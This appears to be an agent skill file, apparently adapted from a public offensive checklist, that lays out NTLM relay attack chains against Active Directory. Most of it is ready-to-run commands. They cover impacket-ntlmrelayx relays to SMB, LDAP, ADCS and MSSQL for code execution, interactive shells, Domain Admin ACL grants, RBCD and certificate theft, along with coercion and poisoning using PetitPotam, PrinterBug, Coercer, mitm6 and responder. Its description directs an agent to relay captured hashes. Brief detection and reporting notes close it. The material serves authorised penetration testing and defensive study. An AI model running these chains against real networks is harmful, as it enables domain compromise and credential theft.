---
name: offensive-ntlm-relay
description: "NTLM relay attack chains using impacket-ntlmrelayx — relay targets identified by signing-not-required, SMB→SMB code execution, SMB→LDAP for ACL grants and computer-account creation, HTTP→LDAP for delegation, HTTP→ADCS Web Enrollment (ESC8), MSSQL relay, krbrelayx for Kerberos relay variants, EPA (Extended Protection for Authentication) bypass research, and the complete coercion-to-relay chain. Use after capturing LLMNR/NBT-NS/IPv6 hashes — relay them rather than crack when relay is feasible."
---

# NTLM Relay

Relay captured NTLM authentications to other services where they're authorized. The captured user authenticates to the attacker; the attacker forwards that auth (still with cryptographically valid challenge-response) to a third party that accepts the user's credentials.

## Quick Workflow

1. Identify relay targets (no SMB signing or LDAP signing)
2. Set up listener that captures incoming NTLM and forwards to chosen target
3. Trigger captures (poisoning per `offensive-network-poisoning` or coercion per `offensive-coercion`)
4. Receive code execution / cert / ACL grant / RBCD on the target
5. Pivot

---

## Identify Relay Targets

```bash
# Hosts without SMB signing required (relayable as SMB target)
nxc smb 10.0.0.0/24 --gen-relay-list relay-targets.txt

# LDAP signing not required → relay to LDAPS works
nxc ldap dc -u user -p pass --module ldap-checker
```

| Property | Required to Relay To |
|---|---|
| SMB signing not required | Relay to SMB |
| LDAP signing not required | Relay to LDAP |
| LDAPS without channel binding | Relay to LDAPS (modern target) |
| HTTP without EPA | Relay to HTTP services (ADCS, EWS) |

## Basic NTLM Relay Setup

```bash
# Relay to LDAP for ACL abuse / RBCD / computer creation
sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support \
  --escalate-user attacker --delegate-access \
  -wh attacker.corp.local

# Single target
sudo impacket-ntlmrelayx -t smb://10.0.0.10 -smb2support -c "whoami"

# Interactive shell on relayed target
sudo impacket-ntlmrelayx -t smb://10.0.0.10 -smb2support -i
# Then: nc localhost 11000 to get the shell
```

## Common Relay Chains

### SMB → SMB (Code Execution on Relay Target)

```bash
sudo impacket-ntlmrelayx -t smb://10.0.0.10 -smb2support \
  -c "powershell -enc <base64>"
```

When the captured user is admin on `10.0.0.10`, code execution there. Without SMB signing required, this is the simplest chain.

### SMB → LDAP (ACL Abuse)

```bash
sudo impacket-ntlmrelayx -t ldaps://dc -smb2support \
  --escalate-user attacker
```

If the relayed user has `WriteDacl` on the domain, attacker is added as Domain Admin via ACL grant. Common when the relayed user is in a privileged group.

### HTTP → LDAP (Coercion + WPAD + Relay)

The classic chain:

```bash
# 1. mitm6 + WPAD respond
sudo mitm6 -d corp.local &
sudo responder -I eth0 -wrf &

# 2. Coerce a DC to authenticate to attacker via HTTP
PetitPotam.py attacker-ip dc.corp.local

# 3. Relay HTTP NTLM to LDAP — set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
sudo impacket-ntlmrelayx -t ldaps://dc --delegate-access \
  -wh attacker.corp.local

# Output: RBCD configured, attacker can S4U as any user → cifs/dc.corp.local
```

### HTTP → ADCS Web Enrollment (ESC8)

```bash
sudo impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support &
PetitPotam.py attacker-ip dc.corp.local

# DC's machine account auth relayed to ADCS, signed certificate issued
# Use cert to mint TGT → DCSync
```

### MSSQL Relay

```bash
sudo impacket-ntlmrelayx -t mssql://10.0.0.30 -smb2support
# Captured user authenticated to MSSQL server; if user is sysadmin, attacker has DB control
```

## EPA (Extended Protection for Authentication)

EPA binds the NTLM auth to the TLS channel — relayed authentication fails because the channel-binding token doesn't match.

| Service | EPA Default |
|---|---|
| LDAP | Off |
| LDAPS | Off (until 2024) — CVE-2024-21434 enabled by default |
| ADCS Web Enrollment | Off in many older deployments |
| Exchange OWA / EWS | On in modern Exchange |

EPA-protected services:
- LDAPS with channel binding required = relay fails
- ADCS Web Enrollment with EPA = ESC8 chain fails
- HTTPS with EPA = HTTP→HTTPS relay fails

Bypasses:
- Use a service that doesn't have EPA enabled
- For LDAPS without strict channel binding, the bypass is implementation-specific

## Computer Account Creation

Any domain user can create up to 10 computer accounts (default `MachineAccountQuota=10`). Combined with NTLM relay:

```bash
# Add a computer to the domain via the captured auth
sudo impacket-ntlmrelayx -t ldaps://dc --add-computer ATTACKER_PC

# Result: ATTACKER_PC$ exists in the domain, attacker has its credentials
# Use it for RBCD or as a generic foothold identity
```

## Coercion → Relay (Most Powerful)

Without LLMNR poisoning (which needs broadcast naïvete), force a target to authenticate to you:

```bash
# Coercer (unified coercion toolkit)
Coercer coerce -t dc.corp.local -u low -p pass -d corp.local -l attacker-ip

# Or specific
PetitPotam.py attacker-ip dc.corp.local
printerbug.py user:pass@dc.corp.local attacker-ip
dfscoerce.py -u user -p pass attacker-ip dc.corp.local
```

See `offensive-coercion` for the full coercion taxonomy.

## krbrelayx (Kerberos Relay)

NTLM relay's Kerberos cousin. When a service expects Kerberos but the channel allows accepting forged tickets:

```bash
# krbrelayx — relay Kerberos auth to LDAP
git clone https://github.com/dirkjanm/krbrelayx
python3 krbrelayx.py -t ldaps://dc --aes <hash> ...
```

Specific scenarios — modern Windows defenses against unconstrained delegation make Kerberos relay more circumstantial than NTLM relay.

## Engagement Cheatsheet

```bash
# 1. Identify relay targets
nxc smb 10.0.0.0/24 --gen-relay-list targets.txt

# 2. Choose target service based on goals
#    - Code exec on workstation: SMB
#    - DA grant: LDAP (with privileged source user)
#    - RBCD on a server: LDAP with --delegate-access
#    - Cert for any user: ADCS with --adcs

# 3. Set up relay
sudo impacket-ntlmrelayx -t <target-protocol-url> \
  -smb2support --delegate-access -wh attacker

# 4. Trigger captures
#    - Poisoning: responder + mitm6 (passive)
#    - Coercion: PetitPotam, PrinterBug, Coercer (active)

# 5. Once relay succeeds, pivot via output (cert, RBCD, code exec)
```

## Detection

| Signal | Defender View |
|---|---|
| MS NTLM Audit (event 8004) on relay target | Relay attempt logged |
| Coercion-protocol traffic to attacker | NIDS rules on EFSRPC/PRPN/DFSNM |
| Computer account created from unusual host | DC event log |
| ADCS cert request from unexpected source | ADCS audit logs |

MDI (Defender for Identity) catches several of these patterns. Operate with knowledge of MDI's footprint when stealth matters.

## Reporting

- Captured user + relay path + target service
- Specific impact (code exec on host X, DA grant, cert for Y, RBCD on Z)
- Time-to-exploit from initial foothold
- Mitigation: enable signing/EPA on the relayed-to service

---

## Key References

- impacket-ntlmrelayx: github.com/fortra/impacket
- "Practical NTLM Relay" (Dirk-jan Mollema research)
- Coercer: github.com/p0dalirius/Coercer
- "Hidden NTLM Relay" research (Microsoft-internal advisories)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/ntlm-relay.md
